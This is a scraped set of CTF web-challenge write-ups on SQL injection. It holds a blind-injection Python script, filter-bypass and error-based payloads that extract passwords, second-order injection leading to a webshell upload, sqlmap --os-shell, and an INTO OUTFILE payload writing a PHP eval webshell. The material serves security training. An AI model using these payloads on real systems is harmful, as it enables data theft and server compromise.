<p>\u53d1\u73b0\u4e86\u6ce8\u5165\u70b9\u5c31\u9700\u8981\u8fdb\u884c\u5c1d\u8bd5\u53bb\u7f16\u5199\u811a\u672c\u53bb\u83b7\u53d6\u6570\u636e\u5e93\u540d\u79f0\u3001\u8868\u540d\u79f0\u3001\u5217\u540d\u79f0\u3001\u6570\u636e\u5e93\u5185\u7684\u503c</p> <pre><code>import time\n\nimport requests\nurl = \"http://e92fadb9-dc06-4156-8184-cb5346128636.node4.buuoj.cn:81/search.php\"\nflag = ''\nfor i in range(1,300):\n    low = 32\n    high = 127\n    while low &lt; high:\n        mid = (low+high)//2\n        # database = \"?id=1^(ord(substr((select(database())),%d,1))&gt;%d)^1\" % (i, mid)\n        # tables = \"?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1\"%(i,mid)\n        # columns = \"?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1\"%(i,mid)\n        data = \"?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1\" % (i, mid)\n        # \u6839\u636e\u9700\u8981\u67e5\u8be2\u7684\u5185\u5bb9\u6539\u53d8get\u4e2d\u7684\u53c2\u6570\n        r = requests.get(url=url+data)\n        if 'Click' in r.text:\n            low = mid + 1\n        else:\n            high = mid\n        time.sleep(0.1)\n    flag += chr(low)\n    print(\"\\r\", end=\"\")\n    print(flag,end='')\n</code></pre>"},{"location":"Web/Chapter8/8-21/","title":"ord() \u7ed5\u8fc7","text":""},{"location":"Web/Chapter8/8-21/#ord-\u7ed5\u8fc7","title":"ord() \u7ed5\u8fc7","text":"<p>\u6253\u5f00\u94fe\u63a5\u662f\u4e00\u4e2a\u67e5\u8be2\u7f51\u7ad9</p> <p></p> <p>\u626b\u76ee\u5f55\u62ff\u5230\u6e90\u7801</p> <pre><code>&lt;?php\n  require(\"conf/config.php\");\n  if (isset($_REQUEST['id'])) { \n        $id = $_REQUEST['id'];\n      if (preg_match(\"/\\d.+?\\D.+/is\",$id)){\n          die(\"Attack detected\");\n        }\n        $query = \"SELECT text from UserInfo WHERE id = \" . $id. \";\"; \n        $results = $conn-&gt;query($query);\n        echo \"\u5b66\u53f7\uff1a\" . $id . \"\uff0c\u6210\u7ee9\u4e3a\uff1a \".$results-&gt;fetch_assoc()['text'];\n   }\n?&gt;\n</code></pre> <p>\u89e3\u6790\u6b63\u5219\u8868\u8fbe\u5f0f</p> <ol> <li>\u4ee5\u4e00\u4e2a\u6570\u5b57\u5f00\u5934(<code>\\d</code>)</li> <li>\u540e\u9762\u8ddf\u7740\u4e00\u4e9b\u5b57\u7b26(<code>.+?</code>)\uff0c\u5c3d\u53ef\u80fd\u5c11\u5730\u5339\u914d</li> <li>\u7136\u540e\u5fc5\u987b\u6709\u4e00\u4e2a\u975e\u6570\u5b57\u5b57\u7b26(<code>\\D</code>)</li> <li>\u6700\u540e\u518d\u8ddf\u7740\u4e00\u4e9b\u5b57\u7b26(<code>.+</code>)</li> </ol> <p>\u7b80\u800c\u8a00\u4e4b\u4e5f\u5c31\u662f\u6570\u5b57\u540e\u9762\u4e0d\u80fd\u8ddf\u5176\u4ed6\u5b57\u7b26</p> <p>\u6784\u9020 payload</p> <pre><code>id=ord('a') union select group_concat(flag) from flag\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-22/","title":"\u4e8c\u6b21\u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-22/#\u4e8c\u6b21\u6ce8\u5165","title":"\u4e8c\u6b21\u6ce8\u5165","text":"<p>\u6253\u5f00\u7f51\u9875\u6709\u4e2a\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd</p> <p></p> <p>\u7f51\u7ad9\u76ee\u5f55\u4e0b <code>/www.tar.gz</code> \u662f\u9690\u85cf\u6587\u4ef6</p> <p></p> <p>\u89e3\u6790\u6e90\u7801\uff1a</p> <p><code>common.inc.php</code>\u4e2d\u5bf9\u6240\u6709 GET\u3001POST\u3001COOKIE \u53c2\u6570\u8fdb\u884c<code>addslashes()</code>\u8f6c\u4e49</p> <pre><code>&lt;?php\n    // \u68c0\u67e5\u8bf7\u6c42\u4e2d\u662f\u5426\u540c\u65f6\u5305\u542b oldname \u548c newname \u4e24\u4e2a\u53c2\u6570\n    if (isset($req['oldname']) &amp;&amp; isset($req['newname'])) {\n        // \u67e5\u8be2\u6570\u636e\u5e93\u4e2d\u662f\u5426\u5b58\u5728\u6307\u5b9a\u7684\u65e7\u6587\u4ef6\u540d\u8bb0\u5f55\n        $result = $db-&gt;query(\"select * from `file` where `filename`='{$req['oldname']}'\");\n        if ($result-&gt;num_rows &gt; 0) {\n            $result = $result-&gt;fetch_assoc();\n        } else {\n            exit(\"old file doesn't exists!\");\n        }\n\n        if ($result) {\n           // \u4f7f\u7528 basename() \u5904\u7406\u65b0\u6587\u4ef6\u540d\uff0c\u9632\u6b62\u8def\u5f84\u904d\u5386\u653b\u51fb\n            $req['newname'] = basename($req['newname']);\n            // \u66f4\u65b0\u6570\u636e\u5e93\u4e2d\u7684\u6587\u4ef6\u540d\uff0c\u5e76\u5c06\u539f\u6587\u4ef6\u540d\u4fdd\u5b58\u5230oldname\u5b57\u6bb5\n            $re = $db-&gt;query(\"update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}\");\n            if (!$re) {\n                print_r($db-&gt;error);\n                exit;\n            }\n            // \u6784\u5efa\u5b8c\u6574\u7684\u65e7\u6587\u4ef6\u8def\u5f84\u548c\u65b0\u6587\u4ef6\u8def\u5f84\uff08\u5305\u542b\u4e0a\u4f20\u76ee\u5f55\u548c\u6587\u4ef6\u6269\u5c55\u540d\uff09\n            $oldname = UPLOAD_DIR . $result[\"filename\"] . $result[\"extension\"];\n            $newname = UPLOAD_DIR . $req[\"newname\"] . $result[\"extension\"];\n            // \u68c0\u67e5\u65e7\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u5b58\u5728\u5219\u91cd\u547d\u540d\n            if (file_exists($oldname)) {\n                rename($oldname, $newname);\n            }\n            $url = \"/\" . $newname;\n            echo \"Your file is rename, url:\n                    &lt;a href=\\\"{$url}\\\" target='_blank'&gt;{$url}&lt;/a&gt;&lt;br/&gt;\n                    &lt;a href=\\\"/\\\"&gt;go back&lt;/a&gt;\";\n        }\n    }\n?&gt;\n</code></pre> <p>\u53d1\u73b0 <code>oldname={$result['filename']}</code> \u5c06\u4e4b\u524d\u4ece\u6570\u636e\u5e93\u4e2d\u67e5\u8be2\u51fa\u7684 <code>filename</code> \u66f4\u65b0\u5230 <code>oldname</code> \u5f53\u4e2d\uff0c\u518d\u6b21\u5165\u5e93\u9020\u6210\u4e8c\u6b21\u6ce8\u5165</p> <p><code>oldname</code> \u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u5b58\u5165\u6570\u636e\u5e93\uff0c<code>newname</code> \u662f\u7528\u6237\u8f93\u5165\u7684\uff0c\u90fd\u662f\u53ef\u63a7\u7684</p> <p>\u90a3\u4e48\u5173\u952e\u70b9\u5728\u4e8e\u53ef\u4ee5\u63a7\u5236\u4e0a\u4f20\u6587\u4ef6\u540d\u5bfc\u81f4\u540e\u7f00\u4e3a\u7a7a\uff0c\u7136\u540e\u901a\u8fc7 <code>update</code> \u4fee\u6539\u6587\u4ef6\u540d\u4e3a\u6076\u610f\u6587\u4ef6\u7c7b\u578b getshell</p> <p>\u901a\u8fc7\u6ce8\u5165\u53ef\u4ee5\u4f7f\u6570\u636e\u5e93\u4e2d\u7684 <code>extension</code> \u5b57\u6bb5\u4e3a\u7a7a\uff0c\u5bfc\u81f4\u6587\u4ef6\u7cfb\u7edf\u5b9e\u9645\u6587\u4ef6\u540d\u4e0e\u6570\u636e\u5e93\u8bb0\u5f55\u4e0d\u4e00\u81f4</p> <p>\u9996\u5148\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u540d\u5305\u542b SQL \u6ce8\u5165 payload \u7684\u6587\u4ef6</p> <pre><code>',extension='',filename='shell.jpg.jpg\n</code></pre> <p></p> <p><code>pathinfo()</code>\u89e3\u6790\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>Array\n(\n    [dirname] =&gt; .\n    [basename] =&gt; ',extension='',filename='shell.jpg.jpg\n    [extension] =&gt; jpg\n    [filename] =&gt; ',extension='',filename='shell.jpg\n)\n</code></pre> <p>\u63d2\u5165\u6570\u636e\u5e93\u7684 SQL \u8bed\u53e5\u53d8\u4e3a\uff1a</p> <pre><code>insert into `file` (`filename`, `view`, `extension`) \nvalues( '\\',extension=\\'\\',filename=\\'shell.jpg', 0, '.jpg')\n</code></pre> <p>\u91cd\u547d\u540d\u8be5\u6587\u4ef6 <code>shell.jpg</code></p> <p></p> <p></p> <p>\u4e0a\u4f20\u4e00\u4e2awebshell\u6587\u4ef6\u540d\u4e3a\uff1a<code>shell.jpg</code></p> <p></p> <p>\u91cd\u547d\u547d\u540d <code>shell.jpg</code> \u4e3a\uff1a<code>shell.php</code></p> <p>\u8681\u5251\u8fde\u63a5\u5373\u53ef</p> <p></p>"},{"location":"Web/Chapter8/8-23/","title":"SQLMap GetShell","text":""},{"location":"Web/Chapter8/8-23/#sqlmap-getshell","title":"SQLMap GetShell","text":"<p>\u8fd9\u9898\u5982\u679c\u76f4\u63a5 <code>or 1=1 #</code> \u4f1a\u62ff\u5230\u5047 flag</p> <p></p> <p>\u4f7f\u7528 SQLMap \u5199\u5165 Shell</p> <pre><code>python sqlmap.py -u \"http://challenge.qsnctf.com:31899/?id=-2\" --os-shell\n</code></pre> <p>\u5728\u8fd9\u91cc\u9009\u62e9 4</p> <p></p> <p>\u5199\u5165\u6210\u529f</p> <p></p> <p>\u8f93\u5165 <code>ls</code> \u6d4b\u8bd5</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter8/8-24/","title":"MP3 \u5143\u6570\u636e\u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-24/#mp3-\u5143\u6570\u636e\u6ce8\u5165","title":"MP3 \u5143\u6570\u636e\u6ce8\u5165","text":"<p>\u6253\u5f00\u7f51\u7ad9\u662f\u4e2a\u4e0a\u4f20\u97f3\u9891\u6587\u4ef6\u7684\u529f\u80fd</p> <p></p> <p>\u53ea\u80fd\u4e0a\u4f20 <code>.mp3</code> \u6587\u4ef6</p> <p></p> <p>\u6211\u4eec\u5c1d\u8bd5\u662f\u5426\u53ef\u4ee5\u5728 <code>exifdata</code> \u4e2d\u6ce8\u5165 SQL\uff0c\u7ed3\u679c\u786e\u5b9e\u53ef\u4ee5</p> <p>\u56e0\u4e3a\u6211\u4eec\u4f7f\u7528 easyTAG \u4fee\u6539\u5143\u6570\u636e</p> <p>\u60a8\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a <code>mp3</code> \u5305\u542b\u4ee5\u4e0b\u5143\u6570\u636e\u7684\u8bed\u53e5\uff1a</p> <pre><code>title  = \"\" (leer)\nauthor = a', (SELECT @@version))-- -b\n</code></pre> <p>\u8fd9\u5c06\u521b\u5efa\u4ee5\u4e0b\u8bed\u53e5</p> <pre><code>INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);\n</code></pre> <p>\u5f00\u5934 <code>a</code> \u548c <code>b</code> \u7ed3\u5c3e\u662f\u5fc5\u8981\u7684\uff0c\u56e0\u4e3a\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u88ab\u622a\u65ad\u4e86</p> <p>\u8fd9\u7ed9\u4e86\u6211\u4eec\u6570\u636e\u5e93\u7248\u672c</p> <pre><code>5.5.49-0ubuntu0.14.04.1\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u60f3\u77e5\u9053\u6570\u636e\u5e93\u540d\u79f0</p> <pre><code>author = a', (SELECT database()))-- -b:\naudioedit\n</code></pre> <p>\u5f53\u7136\u8fd8\u6709\u5217\u540d</p> <pre><code>author = a',(SELECT column_name FROM information_schema.columns WHERE table_name = 'audioedit' LIMIT x,1))-- -a\nwith x in range(0,3):\nid\nfile\nauthor\ntitle\n</code></pre> <p>\u4f46\u662f\u8fd9\u7ed9\u4e86\u6211\u4eec\u4e00\u4e2a\u63d2\u5165\u9519\u8bef\uff01<code>:(</code></p> <p>\u95ee\u9898\u662f\u4f60\u4e0d\u80fd\u540c\u65f6\u4ece\u6b63\u5728\u63d2\u5165\u6570\u636e\u7684\u6570\u636e\u5e93\u4e2d\u8fdb\u884c\u9009\u62e9</p> <pre><code>author = a',(SELECT author FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:\nABCTF\nauthor = a',(SELECT title FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:\nflag\nauthor = a',(SELECT file FROM audioedit.audioedit as blub LIMIT 0,1))-- -a:\nsupersecretflagf1le.mp3\n</code></pre> <p>\u6700\u540e\u5229\u7528\u7684URL\u662f</p> <pre><code>https://web.ctflearn.com/audioedit/edit.php?file =supersecretflagf1le.mp3\n</code></pre> <p></p> <p></p>"},{"location":"Web/Chapter8/8-25/","title":"\u62a5\u9519\u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-25/#\u62a5\u9519\u6ce8\u5165","title":"\u62a5\u9519\u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-26/","title":"like \u7ed5\u8fc7 = \u8fc7\u6ee4","text":""},{"location":"Web/Chapter8/8-26/#like-\u7ed5\u8fc7--\u8fc7\u6ee4","title":"like \u7ed5\u8fc7 = \u8fc7\u6ee4","text":"<p>\u521d\u6b21\u5c1d\u8bd5\u4e07\u80fd\u5bc6\u7801\u767b\u5f55\u6210\u529f\uff0c\u8bf4\u660e\u95ed\u5408\u4e3a\u5355\u5f15\u53f7</p> <p></p> <p><code>updatexml()</code> \u7528\u4e8e\u66f4\u65b0 XML \u6570\u636e\uff0c\u5b83\u63a5\u53d7 3 \u4e2a\u53c2\u6570</p> <pre><code># xml_target\uff1a\u76ee\u6807 XML \u6587\u672c\uff08\u5fc5\u987b\u662f\u5408\u6cd5 XML \u683c\u5f0f\uff0c\u5426\u5219\u62a5\u9519\uff09\n# xpath_expr\uff1aXPath \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u9009\u4e2d XML \u4e2d\u7684\u8282\u70b9\n# new_value\uff1a\u8981\u66f4\u65b0\u7684\u65b0\u503c\nUPDATEXML(xml_target, xpath_expr, new_value)\n</code></pre> <p>\u5728 MySQL \u4e2d\u4f7f\u7528 <code>updatexml()</code> \u51fd\u6570\u62a5\u9519\u65f6\uff0c\u5b83\u901a\u5e38\u4f1a\u629b\u51fa\u4e00\u4e2a XPATH \u8bed\u6cd5\u9519\u8bef\uff0c\u5e76\u5c06\u4f60\u4f20\u5165\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u5373 XPath \u8868\u8fbe\u5f0f\uff09\u7684\u4e00\u90e8\u5206\u76f4\u63a5\u663e\u793a\u5728\u9519\u8bef\u4fe1\u606f\u4e2d</p> <p>\u7b2c\u4e00\u3001\u4e09\u4e2a\u53c2\u6570\u80af\u5b9a\u4f1a\u62a5\u9519\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 <code>database()</code> \u653e\u5728\u4e2d\u95f4\uff0c\u8fd9\u6837\u5c31\u4f1a\u6267\u884c\u663e\u793a\u51fa\u6570\u636e\u5e93\u540d</p> <p>\u53ef\u4ee5\u518d\u52a0\u4e0a <code>concat()</code> \u51fd\u6570\u5c06\u663e\u793a\u5185\u5bb9\u5305\u88f9\u8d77\u6765\uff0c<code>0x7e</code> \u5373\u6ce2\u6d6a\u53f7 <code>~</code></p> <pre><code>1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u7206\u8868\uff0c\u8fd9\u91cc\u6ce8\u610f <code>=</code> \u88ab\u8fc7\u6ee4\u4e86\u4f7f\u7528 <code>like</code> \u4ee3\u66ff</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u7206\u5b57\u6bb5</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#\n</code></pre> <p></p> <p>\u67e5\u5b57\u6bb5\u5185\u5bb9</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#\n</code></pre> <p></p> <p>\u4f7f\u7528 <code>right()</code> \u7a81\u7834\u5b57\u7b26\u9650\u5236</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-27/","title":"right \u7ed5\u8fc7\u663e\u793a\u5b57\u7b26\u9650\u5236","text":""},{"location":"Web/Chapter8/8-27/#right-\u7ed5\u8fc7\u663e\u793a\u5b57\u7b26\u9650\u5236","title":"right \u7ed5\u8fc7\u663e\u793a\u5b57\u7b26\u9650\u5236","text":"<p>\u521d\u6b21\u5c1d\u8bd5\u4e07\u80fd\u5bc6\u7801\u767b\u5f55\u6210\u529f\uff0c\u8bf4\u660e\u95ed\u5408\u4e3a\u5355\u5f15\u53f7</p> <p></p> <p><code>updatexml()</code> \u7528\u4e8e\u66f4\u65b0 XML \u6570\u636e\uff0c\u5b83\u63a5\u53d7 3 \u4e2a\u53c2\u6570</p> <pre><code># xml_target\uff1a\u76ee\u6807 XML \u6587\u672c\uff08\u5fc5\u987b\u662f\u5408\u6cd5 XML \u683c\u5f0f\uff0c\u5426\u5219\u62a5\u9519\uff09\n# xpath_expr\uff1aXPath \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u9009\u4e2d XML \u4e2d\u7684\u8282\u70b9\n# new_value\uff1a\u8981\u66f4\u65b0\u7684\u65b0\u503c\nUPDATEXML(xml_target, xpath_expr, new_value)\n</code></pre> <p>\u5728 MySQL \u4e2d\u4f7f\u7528 <code>updatexml()</code> \u51fd\u6570\u62a5\u9519\u65f6\uff0c\u5b83\u901a\u5e38\u4f1a\u629b\u51fa\u4e00\u4e2a XPATH \u8bed\u6cd5\u9519\u8bef\uff0c\u5e76\u5c06\u4f60\u4f20\u5165\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u5373 XPath \u8868\u8fbe\u5f0f\uff09\u7684\u4e00\u90e8\u5206\u76f4\u63a5\u663e\u793a\u5728\u9519\u8bef\u4fe1\u606f\u4e2d</p> <p>\u7b2c\u4e00\u3001\u4e09\u4e2a\u53c2\u6570\u80af\u5b9a\u4f1a\u62a5\u9519\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 <code>database()</code> \u653e\u5728\u4e2d\u95f4\uff0c\u8fd9\u6837\u5c31\u4f1a\u6267\u884c\u663e\u793a\u51fa\u6570\u636e\u5e93\u540d</p> <p>\u53ef\u4ee5\u518d\u52a0\u4e0a <code>concat()</code> \u51fd\u6570\u5c06\u663e\u793a\u5185\u5bb9\u5305\u88f9\u8d77\u6765\uff0c<code>0x7e</code> \u5373\u6ce2\u6d6a\u53f7 <code>~</code></p> <pre><code>1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u7206\u8868\uff0c\u8fd9\u91cc\u6ce8\u610f <code>=</code> \u88ab\u8fc7\u6ee4\u4e86\u4f7f\u7528 <code>like</code> \u4ee3\u66ff</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u7206\u5b57\u6bb5</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#\n</code></pre> <p></p> <p>\u67e5\u5b57\u6bb5\u5185\u5bb9</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#\n</code></pre> <p></p> <p>\u4f7f\u7528 <code>right()</code> \u7a81\u7834\u5b57\u7b26\u9650\u5236</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-28/","title":"^ \u4ee3\u66ff or","text":""},{"location":"Web/Chapter8/8-28/#-\u4ee3\u66ff-or","title":"^ \u4ee3\u66ff or","text":"<p>\u521d\u6b21\u5c1d\u8bd5\u4e07\u80fd\u5bc6\u7801\u767b\u5f55\u6210\u529f\uff0c\u8bf4\u660e\u95ed\u5408\u4e3a\u5355\u5f15\u53f7</p> <p></p> <p><code>extractvalue()</code> \u662f MySQL \u7684 XML \u51fd\u6570\uff0c\u7528\u4e8e\u4ece XML \u5b57\u7b26\u4e32\u4e2d\u63d0\u53d6\u6570\u636e</p> <pre><code># xml_fragment\uff1a\u4e00\u4e2a\u5408\u6cd5\u7684 XML \u7ed3\u6784\u4f53\uff08\u5b57\u7b26\u4e32\u683c\u5f0f\uff09\n# xpath_expression\uff1aXPath \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u4ece XML \u4e2d\u5b9a\u4f4d\u5e76\u63d0\u53d6\u8282\u70b9\u6216\u5c5e\u6027\u503c\nEXTRACTVALUE(xml_fragment, xpath_expression)\n</code></pre> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u80af\u5b9a\u4f1a\u62a5\u9519\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 <code>database()</code> \u653e\u5728\u4e2d\u95f4\uff0c\u8fd9\u6837\u5c31\u4f1a\u6267\u884c\u663e\u793a\u51fa\u6570\u636e\u5e93\u540d</p> <p>\u53ef\u4ee5\u518d\u52a0\u4e0a <code>concat()</code> \u51fd\u6570\u5c06\u663e\u793a\u5185\u5bb9\u5305\u88f9\u8d77\u6765\uff0c<code>0x7e</code> \u5373\u6ce2\u6d6a\u53f7 <code>~</code></p> <pre><code>1'^extractvalue(1,concat(0x7e,(select(database()))))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u7206\u8868\uff0c\u8fd9\u91cc\u6ce8\u610f <code>=</code> \u88ab\u8fc7\u6ee4\u4e86\u4f7f\u7528 <code>like</code> \u4ee3\u66ff</p> <pre><code>1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u7206\u5b57\u6bb5</p> <pre><code>1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#\n</code></pre> <p></p> <p>\u67e5\u5b57\u6bb5\u5185\u5bb9</p> <pre><code>1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#\n</code></pre> <p></p> <p>\u4f7f\u7528 <code>right()</code> \u7a81\u7834\u5b57\u7b26\u9650\u5236</p> <pre><code>1'^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-29/","title":"into outfile GetShell","text":""},{"location":"Web/Chapter8/8-29/#into-outfile-getshell","title":"into outfile GetShell","text":"<p>\u5199 Shell \u5373 MySQL \u9700\u8981\u5bf9\u5916\u5199\u6587\u4ef6\uff0c\u4f46\u9ed8\u8ba4 MySQL \u662f\u4e0d\u5141\u8bb8\u4f7f\u7528 <code>outfile</code> \u6765\u5bfc\u51fa\u6570\u636e\u7684\uff0c\u5148\u624b\u52a8\u5728 MySQL \u786e\u8ba4\u4e00\u4e0b</p> <pre><code>show global variables like '%secure%';\n</code></pre> <p>MYSQL \u7684\u7279\u6027 secure_file_priv \u5bf9\u8bfb\u5199\u6587\u4ef6\u7684\u5f71\u54cd\uff0c\u6b64\u5f00\u5173\u9ed8\u8ba4\u4e3a NULL\uff0c\u5373\u4e0d\u5141\u8bb8\u5bfc\u5165\u5bfc\u51fa</p> <p></p> <p>\u8fd9\u91cc\u6709\u4e2a\u5c0f\u6ce8\u610f\u4e8b\u9879\uff0c\u4e0d\u80fd\u76f4\u63a5\u628a  <code>&lt;?php eval($_POST['pwd']);?&gt;</code>  \u8f6c 16 \u8fdb\u5236\uff0c\u56e0\u4e3a  <code>&lt;?php eval</code>  \u4e4b\u95f4\u7684\u7a7a\u683c\u4e0d\u4f1a\u4fdd\u7559\u7684\u3002\u56e0\u6b64\u8981\u624b\u52a8\u52a0\u4e0a  <code>20</code>  \u7a7a\u683c</p> <p></p> <pre><code>id=1')) union select null,0x3c3f706870206576616c28245f504f53545b27636d64275d293b3f3e,null into outfile '\u5177\u4f53\u5b9e\u9645\u8def\u5f84' --+\n</code></pre>"},{"location":"Web/Chapter8/8-3/","title":"() \u7ed5\u8fc7\u7a7a\u683c\u8fc7\u6ee4","text":""},{"location":"Web/Chapter8/8-3/#-\u7ed5\u8fc7\u7a7a\u683c\u8fc7\u6ee4","title":"() \u7ed5\u8fc7\u7a7a\u683c\u8fc7\u6ee4","text":"<p>\u5c1d\u8bd5\u5f31\u53e3\u4ee4\u56de\u663e\u5bc6\u7801\u9519\u8bef</p> <p></p> <p>\u7528\u6237\u540d\u662f admin\uff0c\u4e07\u80fd\u5bc6\u7801\u56de\u663e\u975e\u6cd5\u5b57\u7b26</p> <p></p> <p>fuzz \u6d4b\u8bd5\u4e00\u6ce2\u770b\u770b\u8fc7\u6ee4\u4e86\u54ea\u4e9b</p> <p></p> <p>\u8fc7\u6ee4\u4e86\u7a7a\u683c\uff0c\u53ef\u4ee5\u4f7f\u7528 () \u7ed5\u8fc7</p> <p>\u540c\u65f6\u8fc7\u6ee4\u4e86 =\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u7528 &lt;&gt; \u66ff\u6362 !=</p> <p>\u4ed6\u4fe9\u90fd\u8868\u793a\u4e0d\u7b49\u4e8e\uff0c\u4e8e\u662f\u53ef\u4ee5\u6784\u9020\u8bed\u53e5\uff0c\u5148\u6c38\u5047\u6761\u4ef6\u6d4b\u8bd5\u8fd4\u56de\u7528\u6237\u540d\u4e0d\u5b58\u5728</p> <pre><code>hjakshdksjah'or(1&lt;&gt;1)#\n</code></pre> <p></p> <p>\u518d\u6c38\u771f\u6761\u4ef6\u6d4b\u8bd5\u8fd4\u56de\u5bc6\u7801\u4e0d\u5b58\u5728</p> <pre><code>hjakshdksjah'or(1&lt;&gt;2)#\n</code></pre> <p></p> <p>\u9996\u5148\u662f\u54b1\u8f93\u5165\u7684\u7528\u6237\u540d\u80af\u5b9a\u662f\u4e0d\u5b58\u5728\u7684\uff08\u952e\u76d8\u778e\u6309\u7684\uff09</p> <p>\u5982\u679c or \u8bed\u53e5\u4e3a\u5047\u5219\u7528\u6237\u540d\u4e0d\u5b58\u5728\uff0c\u53cd\u4e4b\u4e3a\u771f\uff0c\u7531\u6b64\u53ef\u4ee5\u5148\u6d4b\u8bd5\u6570\u636e\u5e93\u957f\u5ea6</p> <p>\u6700\u540e\u5f97\u5230\u6570\u636e\u5e93\u957f\u5ea6\u4e3a 8</p> <pre><code>hjakshdksjah'or(length(database()&gt;0))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u9700\u8981\u7206\u7834\u6570\u636e\u5e93\u540d\uff0c\u4f46\u662f\u5b83\u8fc7\u6ee4\u4e86\u9017\u53f7</p> <p>\u60f3\u5230\u4e86\u5b57\u7b26\u4e32\u622a\u53d6\u51fd\u6570 <code>substr()</code> \u4e0d\u8981\u9017\u53f7\u7a7a\u683c\u7684\u7528\u6cd5</p> <pre><code># from \u540e\u9762\u7684\u6570\u5b57\u8868\u793a\u5b83\u4ece\u7b2c\u51e0\u4f4d\u5f00\u59cb\u53d6\u5b57\u7b26\nsubstr('flag' from 1)       # \u8fd4\u56de\uff1aflag\nsubstr('flag' from 2)       # \u8fd4\u56de\uff1alag\n</code></pre> <p>\u53ef\u4ee5\u6784\u9020\u4e0b\u9762 payload \u62ff\u5230\u6570\u636e\u5e93\u540d</p> <pre><code>substr((database())from(1))\n</code></pre> <p>\u4f46\u662f for \u6709\u622a\u53d6\u957f\u5ea6\u9650\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u518d\u5957\u4e00\u4e2a <code>substr() + reverse()</code> \u6bcf\u6b21\u53ea\u622a\u53d6\u4e00\u4f4d</p> <pre><code>substr((reverse(substr('flag' form 1))) from 4 )        # \u8fd4\u56de\uff1af\nsubstr((reverse(substr('flag' form 2))) from 3 )        # \u8fd4\u56de\uff1al\nsubstr((reverse(substr('flag' form 3))) from 2 )        # \u8fd4\u56de\uff1aa\nsubstr((reverse(substr('flag' form 4))) from 1 )        # \u8fd4\u56de\uff1ag\n</code></pre> <p>\u6700\u540e\u518d\u5229\u7528\u4e4b\u524d &lt;&gt; \u914d\u5408 <code>ord()</code> \u8f6c ASCII \u7801\u6bd4\u8f83</p> <pre><code>asdadadadadas'or(ord(substr(reverse(substr((database())from(1)))from(8)))&lt;&gt;115)#\n</code></pre> 